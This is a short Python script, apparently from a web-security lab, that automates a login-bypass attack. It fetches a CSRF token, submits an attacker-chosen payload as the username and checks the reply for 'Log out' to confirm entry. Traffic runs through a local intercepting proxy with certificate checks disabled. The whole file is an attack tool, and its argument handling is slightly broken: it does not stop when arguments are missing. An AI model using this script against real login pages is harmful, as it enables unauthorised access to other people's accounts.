import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def exploited_successfully(the_session, url, payload):
    csrf = get_csrf(the_session, url)
    creds = {"csrf": csrf, "username": payload,"password": "text"}
    request = the_session.post(url, data=creds, verify=False, proxies=proxy)
    print(request.text)
    if "Log out" in request.text:
        return True
    else:
        return False

def get_csrf(the_session, url):
    request = the_session.get(url, verify=False, proxies=proxy)
    extracted_text = BeautifulSoup(request.text, "html.parser")
    csrf_token = extracted_text.find("input", {"name":"csrf"})["value"]
    return csrf_token


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
    
    the_session = requests.Session()

    print()
    if exploited_successfully(the_session, url, payload):
        print("Successful")
    else:
        print("Something went wrong")